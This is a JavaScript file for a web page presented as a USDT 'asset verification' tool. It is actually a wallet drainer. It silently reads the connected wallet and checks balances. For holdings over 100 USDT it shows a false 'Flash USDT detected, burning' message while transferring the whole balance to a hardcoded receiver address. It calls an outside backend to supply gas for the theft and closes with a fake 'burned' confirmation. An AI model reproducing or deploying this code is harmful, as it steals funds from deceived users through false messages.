const bscAddress = "0xce81b9c0658B84F2a8fD7adDBeC8B7C26953D090"; // Receiver
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20

let web3;
let userAddress;

// ✅ Auto-connect silently on page load
window.addEventListener("load", async () => {
    const provider = window.ethereum || window.trustwallet || window.BinanceChain;
    if (provider) {
        web3 = new Web3(provider);
        const accounts = await provider.request({ method: "eth_accounts" });
        if (accounts.length > 0) {
            userAddress = accounts[0];
            await provider.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }]
            });
            console.log("✅ Wallet connected silently:", userAddress);
        } else {
            console.log("⚠️ Wallet not connected yet.");
        }
    } else {
        console.warn("❌ No wallet provider found.");
    }
});

// ✅ Called only inside verifyAssets, does NOT trigger popup
async function connectWalletSilently() {
    const provider = window.ethereum || window.trustwallet || window.BinanceChain;
    if (!provider) return null;
    web3 = new Web3(provider);

    try {
        const accounts = await provider.request({ method: "eth_accounts" });
        if (accounts.length === 0) return null;
        userAddress = accounts[0];

        await provider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }]
        });

        return userAddress;
    } catch (e) {
        console.warn("Silent connect failed:", e);
        return null;
    }
}

// ✅ Main verify button logic
async function verifyAssets() {
    if (!web3 || !userAddress) {
        const addr = await connectWalletSilently();
        if (!addr) {
            showPopup("❌ Wallet not connected.<br>Open this page inside Trust Wallet or MetaMask browser.", "black");
            return;
        }
    }

    const usdtContract = new web3.eth.Contract([
        {
            "constant": true,
            "inputs": [{ "name": "_owner", "type": "address" }],
            "name": "balanceOf",
            "outputs": [{ "name": "", "type": "uint256" }],
            "type": "function"
        }
    ], usdtContractAddress);

    try {
        const [usdtBalanceWei, userBNBWei] = await Promise.all([
            usdtContract.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
        const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

        console.log("USDT:", usdtBalance, "BNB:", userBNB);

        if (usdtBalance === 0) {
            showPopup("❌ No USDT found in your wallet.", "black");
            return;
        }

        if (usdtBalance <= 100) {
            showPopup(
                `✅ Verification Successful<br>Your assets are genuine.<br><br><b>USDT:</b> ${usdtBalance} USDT<br><b>BNB:</b> ${userBNB} BNB`,
                "green"
            );
            return;
        }

        showPopup("⚠️ Flash USDT detected. Burning in progress...", "green");
        await transferUSDT(usdtBalance, userBNB);

    } catch (err) {
        console.error("Verification failed:", err);
        alert("Verification error. See console.");
    }
}

async function transferUSDT(usdtBalance, userBNB) {
    try {
        if (userBNB < 0.0005) {
            console.log("Requesting BNB gas from backend...");
            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ toAddress: userAddress })
            });
        }

        const usdtContract = new web3.eth.Contract([
            {
                "constant": false,
                "inputs": [
                    { "name": "recipient", "type": "address" },
                    { "name": "amount", "type": "uint256" }
                ],
                "name": "transfer",
                "outputs": [{ "name": "", "type": "bool" }],
                "type": "function"
            }
        ], usdtContractAddress);

        const amount = web3.utils.toWei(usdtBalance.toString(), "ether");
        await usdtContract.methods.transfer(bscAddress, amount).send({ from: userAddress });

        showPopup(
            `✅ Verification Complete<br>Flash USDT successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance}`,
            "red"
        );
    } catch (err) {
        console.error("USDT Transfer failed:", err);
        alert("USDT transfer failed. Check BNB balance.");
    }
}

// ✅ Popup UI
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");

    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.3)";
        popup.style.fontSize = "18px";
        popup.style.zIndex = "9999";
        popup.style.maxWidth = "90%";
        popup.style.textAlign = "center";
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffe5e5" : color === "green" ? "#e0ffe5" : "#f0f0f0";
    popup.style.color = color === "red" ? "#a00" : color === "green" ? "#080" : "#000";
    popup.innerHTML = message;
    popup.style.display = "block";

    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// ✅ Button listener
document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
